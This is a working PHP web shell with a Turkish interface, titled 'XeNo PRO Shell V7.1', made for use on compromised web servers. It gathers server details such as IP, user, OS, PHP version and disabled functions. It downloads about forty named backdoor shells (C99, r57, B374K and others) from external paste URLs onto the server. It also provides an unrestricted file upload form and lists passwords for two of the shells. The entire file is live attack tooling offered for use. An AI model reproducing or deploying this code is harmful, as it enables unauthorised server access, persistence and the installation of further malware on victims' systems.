<html>
<head>
<meta content="text/html; charset=ISO-8859-1"
http-equiv="content-type">
<title>XeNo PRO Shell V7.1</title>
<link rel="Shortcut Icon"  href="http://i.hizliresim.com/lEjk9l.png"  type="image/x-icon">
</head>
<center><body background="http://i.hizliresim.com/BZN9Jg.gif" onload="writetext()" onkeydown="return false" oncontextmenu="return false" onselectstart="return false" ondragstart="return false"></center>
<div style="text-align: left;"><span style="color: rgb(0, 153, 0);"></span><span
style="color: rgb(51, 204, 0); font-weight: bold;"><span
style="color: rgb(153, 153, 0);"><center>/-\</center></span></span><span
style="color: red; font-weight: bold;"><a><center>XeNo Shell V7.1 by MrCylops</center></a></span><span
style="font-weight: bold;"> </span><span
style="color: rgb(51, 204, 0); font-weight: bold;"><span
style="color: rgb(153, 153, 0);"><center>\-/</center></span></span><span
style="color: white;"></span>
<span style="font-weight: bold;"></span><br>
<span style="font-weight: bold;">
<span style="font-weight: bold;"></span><span
style="color: rgb(0, 153, 0);"><big><small><b><span
style="color: rgb(204, 153, 51);"><center>SUNUCU HAKKINDA:</center></span></b></small></big></span></small><br>
<small><span style="color: rgb(0, 153, 0);"><big><center>
<small>---------------------------------------------------------------------------------------------------------------------------------------------------<br>
<?php
set_time_limit(0);
error_reporting(0);
echo "<b>[+]<span style=\"color: lime;\"> Sunucu IP'si         : </span></b>".$_SERVER['SERVER_ADDR']."<br>";
echo "<b>[+]<span style=\"color: lime;\"> Sunucu Admin      : </span></b>".$_SERVER['SERVER_ADMIN']."<br>";
echo "<b>[+]<span style=\"color: lime;\"> Klasor               : </span></b>".getcwd()."<br>";
echo "<b>[+]<span style=\"color: lime;\"> Kullanici              : </span></b>".get_current_user()."<br>";
echo "<b>[+]<span style=\"color: lime;\"> Sunucu Yazilimi   : </span></b>".$_SERVER['SERVER_SOFTWARE']."<br>";
echo "<b>[+]<span style=\"color: lime;\"> Uname             : </span></b>".php_uname()."<br>";
echo "<b>[+]<span style=\"color: lime;\"> Php Ver.       : </span></b>".phpversion()."<br>";
////////////////////////////////////
echo "<b>[+]<span style=\"color: lime;\"> Guvenli Mod         : </span></b>";
	if(@ini_get('safe_mode') or strtolower(@ini_get('safe_mode')) == 'on'){
		echo "<span style=\"font-weight: bold; color: red;\">On</span>";
		
	}else{ echo"<span style=\"color: rgb(153, 153, 153);\">Off</span>"; }
echo "<br>";
//////////////////////////////////
echo "<b>[+]<span style=\"color: lime;\"> Curl                 :</span></b>";
	if(function_exists("curl_version")){
		echo"<span style=\"font-weight: bold; color: red;\">On</span>";
	}else{ echo"<span style=\"color: rgb(153, 153, 153);\">Off</span>";}

echo " - <b>[+]<span style=\"color: lime;\"> Mssql                 :</span></b>";
	if(function_exists("mssql_connect")){
		echo"<span style=\"font-weight: bold; color: red;\">On</span>";
	}else{ echo"<span style=\"color: rgb(153, 153, 153);\">Off</span>";}
	
echo " - <b>[+]<span style=\"color: lime;\"> Perl                 :</span></b>";
	if(function_exists("perl -h")){
		echo"<span style=\"font-weight: bold; color: red;\">On</span>";
	}else{ echo"<span style=\"color: rgb(153, 153, 153);\">Off</span>";}

echo " - <b>[+]<span style=\"color: lime;\"> Python                 :</span></b>";
	if(function_exists("python -h")){
		echo"<span style=\"font-weight: bold; color: red;\">On</span>";
	}else{ echo"<span style=\"color: rgb(153, 153, 153);\">Off</span>";}
	
echo " - <b>[+]<span style=\"color: lime;\"> Postgrase                 :</span></b>";
	if(function_exists("pg_connect")){
		echo"<span style=\"font-weight: bold; color: red;\">On</span>";
	}else{ echo"<span style=\"color: rgb(153, 153, 153);\">Off</span>";}
	
	echo " - <b>[+]<span style=\"color: lime;\"> Bash                 :</span></b>";
	if(function_exists("bash -h")){
		echo"<span style=\"font-weight: bold; color: red;\">On</span>";
	}else{ echo"<span style=\"color: rgb(153, 153, 153);\">Off</span>";}

echo " - <b>[+]<span style=\"color: lime;\"> Mysql                 :</span></b>";
	if(function_exists("mysql_connect")){
		echo"<span style=\"font-weight: bold; color: red;\">On</span>";
	}else{ echo"<span style=\"color: rgb(153, 153, 153);\">Off</span>";}


echo " - <b>[+]<span style=\"color: lime;\"> Oracle                 :</span></b>";
	if(function_exists("ocilogon")){
		echo"<span style=\"font-weight: bold; color: red;\">On</span>";
	}else{ echo"<span style=\"color: rgb(153, 153, 153);\">Off</span>";}

//////////////////////////////////
echo "<br><b>[+]<span style=\"color: lime;\"> Devre Disi Fonksiyon  : </span></b>";

	$disable_funs = @ini_get('disable_functions');
	$arr = explode(',', $disable_funs);
	foreach($arr as $fun){
		echo "<span style=\"font-weight: bold; color: red;\">$fun</span>"." - ";
	}


/* or
	$funs =array("system","exec","shell_exec","passthru","ln","copy","symlink","show_source","mail");
		foreach($funs as $fun){
			if(!function_exists($fun)){
				echo $fun." - ";
			}
		}*/
//////////////////////////////
echo"<br>";
echo"---------------------------------------------------------------------------------------------------------------------------------------------------<br><br>";
echo'<form method="post">
<b>[+]<span style=\"color: lime;\"> Arsivdeki Sheller: <b></span><select name="tools" >
<option>Lutfen Shell Secin...</option>
<option>K2ll33D SHELL</option>
<option>Adminer SHELL</option>
<option>Alucar SHELL</option>
<option>Angel SHELL</option>
<option>AntiChat SHELL</option>
<option>B374K SHELL</option>
<option>Backdoor SHELL</option>
<option>C99 SHELL</option>
<option>C100 SHELL</option>
<option>CTT SHELL</option>
<option>CW SHELL</option>
<option>Ekinox SHELL</option>
<option>ElmaliSeker (ASP)</option>
<option>Erne SHELL</option>
<option>FTPSEARCH.PHP</option>
<option>G00N SHELL</option>
<option>GaZa SHELL</option>
<option>H4CK3R SHELL</option>
<option>Jackal SHELL</option>
<option>Kacak (ASP)</option>
<option>Kral SHELL</option>
<option>Liz0zim SHELL</option>
<option>Login.PHP</option>
<option>Lolipop SHELL</option>
<option>NCPH.PHP</option>
<option>Network.PHP</option>
<option>Priv57 SHELL</option>
<option>r00t.PHP</option>
<option>r57 SHELL 1.40</option>
<option>Safe0ver.PHP</option>
<option>Sima Attacker</option>
<option>Sosyete SHELL</option>
<option>SQL.PHP</option>
<option>Syrian.PHP</option>
<option>Upload SHELL</option>
<option>ww.PHP</option>
<option>x2300 SHELL</option>
<option>ZACO SHELL</option>
<option>Zehir (ASP)</option>
<option>Web (ASPX)</option>
<option>KlasveyV (ASP)</option>
<option>FSO (ASP)</option>
<option>File (ASPX)</option>

</select>
<input type="submit" name="get" value="Yukle" />
</form>';
/////////////////////////////////////////////////////////////////
if(isset($_POST['get'])){
	switch($_POST['tools']){
        //////////////////////////////////////////////         
		case "Adminer SHELL":
		echo gino('http://hastebin.com/raw/boqewidoru','adminer.php');
		break;	
		//////////////////////////////////////////////
		        		case "CW SHELL":
		echo gino('http://hastebin.com/raw/jokusafije','cw.php');
		break;
		//////////////////////////////////////////////
		        		case "Alucar SHELL":
		echo gino('http://hastebin.com/raw/tuhiwiyace','alucar.php');
		break;
		//////////////////////////////////////////////
		        		case "Angel SHELL":
		echo gino('http://hastebin.com/raw/dukonujiyi','angel.php');
		break;
		//////////////////////////////////////////////
		        		case "Antichat SHELL":
		echo gino('http://hastebin.com/raw/fumodukuja','antichat.php');
		break;
		//////////////////////////////////////////////
		        		case "B374K SHELL":
		echo gino('http://hastebin.com/raw/lapopogaza','b374.php');
		break;
		//////////////////////////////////////////////
		        		case "Backdoor SHELL":
		echo gino('http://hastebin.com/raw/atoyawoluh','back.php');
		break;
		//////////////////////////////////////////////	
		        		case "C99 SHELL":
		echo gino('http://hastebin.com/raw/owapoqegar','c99.php');
		break;
		//////////////////////////////////////////////
		case "K2ll33D SHELL":
		echo gino('http://hastebin.com/raw/yupubawegi','k2.php');
		break;				
		//////////////////////////////////////////////
        		case "C100 SHELL":
		echo gino('http://hastebin.com/raw/hidesoquwu','c100.php');
		break;		
		//////////////////////////////////////////////	
		        		case "CTT SHELL":
		echo gino('http://hastebin.com/raw/adijuwoliv','ctt.php');
		break;
		//////////////////////////////////////////////	
        		case "Ekinox SHELL":
		echo gino('http://hastebin.com/raw/esivinawuw','ekino.php');
		break;		
		//////////////////////////////////////////////
        		case "Erne SHELL":
		echo gino('http://hastebin.com/raw/ejiqumerov','ern.php');
		break;		
		//////////////////////////////////////////////
        		case "FTPSEARCH.PHP":
		echo gino('http://hastebin.com/raw/ucejojikuw','ftp.php');
		break;		
		//////////////////////////////////////////////
        		case "G00N SHELL":
		echo gino('http://hastebin.com/raw/eqerahiyil','g00n.php');
		break;		
		//////////////////////////////////////////////
		        		case "GaZa SHELL":
		echo gino('http://hastebin.com/raw/mozatociho','gaza.php');
		break;
		//////////////////////////////////////////////
		        		case "H4CK3R SHELL":
		echo gino('http://hastebin.com/raw/soyujogixe','h4ck3r.php');
		break;
		//////////////////////////////////////////////
		        		case "Jackal SHELL":
		echo gino('http://hastebin.com/raw/gujigaguva','jackal.php');
		break;
		//////////////////////////////////////////////	
		        		case "Kral SHELL":
		echo gino('http://hastebin.com/raw/befuvoxiji','king.php');
		break;
		//////////////////////////////////////////////
		        		case "Liz0zim SHELL":
		echo gino('http://hastebin.com/raw/opakaqekaz','liz.php');
		break;
		//////////////////////////////////////////////
		        		case "Login.PHP":
		echo gino('http://hastebin.com/raw/ezuyobuluv','login.php');
		break;
		//////////////////////////////////////////////
        		case "Lolipop SHELL":
		echo gino('http://hastebin.com/raw/riragizogu','loli.php');
		break;		
        //////////////////////////////////////////////	
				        		case "NCPH.PHP":
		echo gino('http://hastebin.com/raw/dududowinu','ncph.php');
		break;
        //////////////////////////////////////////////
		        		case "Network.PHP":
		echo gino('http://hastebin.com/raw/omasatosab','net.php');
		break;
        //////////////////////////////////////////////
        		case "Priv57 SHELL":
		echo gino('http://hastebin.com/raw/vagogufuhi','priv57.php');
		break;		
        //////////////////////////////////////////////
		        		case "r00t.PHP":
		echo gino('http://hastebin.com/raw/udizuhubug','r00t.php');
		break;
		//////////////////////////////////////////////
				        		case "Safe0ver.PHP":
		echo gino('http://hastebin.com/raw/kivihuduka','safe.php');
		break;
		//////////////////////////////////////////////
				        		case "r57 SHELL 1.40":
		echo gino('http://hastebin.com/raw/urejigimex','r57_1.40.php');
		break;
		//////////////////////////////////////////////
                case "AnonsShell Priv8":
		echo gino('http://hastebin.com/raw/hixohoxiyo','Anons.php');
		break;
		//////////////////////////////////////////////
				        		case "Sima Attacker":
		echo gino('http://hastebin.com/raw/qowujitufe','sima.php');
		break;
		//////////////////////////////////////////////
				        		case "Sosyete SHELL":
		echo gino('http://hastebin.com/raw/vesoyoheso','sosyete.php');
		break;
		//////////////////////////////////////////////
				        		case "Syrian.PHP":
		echo gino('http://hastebin.com/raw/egevaboheq','syr.php');
		break;
		//////////////////////////////////////////////
				        		case "SQL.PHP":
		echo gino('http://hastebin.com/raw/uyowiricuq','sql.php');
		break;
		//////////////////////////////////////////////
				        		case "Upload SHELL":
		echo gino('http://hastebin.com/raw/zajefegoci','upload.php');
		break;
		//////////////////////////////////////////////
				        		case "ww.PHP":
		echo gino('http://hastebin.com/raw/oxawoqaxiz','ww.php');
		break;
		//////////////////////////////////////////////
				        		case "x2300 SHELL":
		echo gino('http://hastebin.com/raw/butaxinuyo','x2300.php');
		break;
		//////////////////////////////////////////////
				        		case "ZACO SHELL":
		echo gino('http://hastebin.com/raw/furetemedo','zaco.php');
		break;
		//////////////////////////////////////////////
				        		case "Zehir (ASP)":
		echo gino('http://hastebin.com/raw/qelesipayo','zehir.asp');
		break;
		//////////////////////////////////////////////
				        		case "Web (ASPX)":
		echo gino('http://hastebin.com/raw/reveheyipu','web.aspx');
		break;
		//////////////////////////////////////////////
				        		case "KlasveyV (ASP)":
		echo gino('http://hastebin.com/raw/fopirohebu','klasveyv.asp');
		break;
		//////////////////////////////////////////////
				        		case "File (ASPX)":
		echo gino('http://hastebin.com/raw/zesahuzixa','file.aspx');
		break;
		//////////////////////////////////////////////
				        		case "FSO (ASP)":
		echo gino('http://hastebin.com/raw/novufaruro','fso.asp');
		break;
		//////////////////////////////////////////////

		} // switch end
}// end if
////////////////////////////////////////////////////////////////
// by XeNoThePCPRO
function gino($input,$output){
	@mkdir('xeno');
	@chdir('./xeno');
	
	if(!file_exists($output)){
		
	$cn = @file_get_contents($input);
	$save = fopen("$output","a+"); fwrite($save,@file_get_contents($input)); fclose($save);
	return "<br>[+] Dosya Konumu : <a href=\"./xeno/$output\"> TIKLA! </a>";
	}else{ return "<br>[+] Bu Dosya Zaten VAR! : <a href=\"./xeno/$output\"> TIKLA! </a>"; }
	
}				
///////////////////////////////////////////////////////////////

?>

<br><br><br><br>
<span style="color: red;">[+]</span> <span
style="color: rgb(0, 153, 0);"><span style="color: rgb(51, 204, 0);"><span
style="color: red;">DIKKAT!</span> :</span>B374K'nin<span
style="color: orange(51, 204, 0);"> Sifresi </span> : <span
style="color: blue;">b374k'dir.</span></span>
<br>   </br>
<span style="color: red;">[+]</span> <span
style="color: red;">DIKKAT!</span> :</span>Jackal Shell'in<span
style="color: orange(51, 204, 0);"> Sifresi </span> : <span
style="color: blue;">cylops dur.</span></span>
<br>
<font style="text-shadow:0px 1px 5px +000;">&nbsp; </font>


<iframe width="0" height="0" src="http://www.youtube.com/embed/KStW0n6MfnY?t=13s&rel=0&amp;autoplay=1" frameborder="0" allowfullscreen></iframe>

<!-- start header -
wWw.KraLaLemi.Com  Kod BasLangiCi-->
<style type="text/css">body,a:hover{cursor:url(http://cur.cursors-4u.net/cursors/cur-9/cur858.ani),url(http://cur.cursors-4u.net/cursors/cur-9/cur858.png),progress!important;}</style> 

<meta name="viewport" content="width=device-width, initial-scale=1.0">
<br>          </br>
<br>          </br>
<br>          </br>
<body onkeydown="return false">
<span style="color: red;">XeNo Uploader PRO [For Custom Files]</span> <span
style="color: red;"></span></span><span
style="color: orange(51, 204, 0);"></span><span
style="color: blue;"></span></span>
<br>          </br>

<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
 if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>DOSYA BU SHELLIN OLDUGU KLASOR/KONUMA YUKLENMISITIR </b><br><br>'; }
 else { echo '<b>UPLOAD BASARISIZ BUNUN ICIN COK UZULDUM :(</b><br><br>'; }
}
?>


</big>
</span>
</body>
</html>
</center>
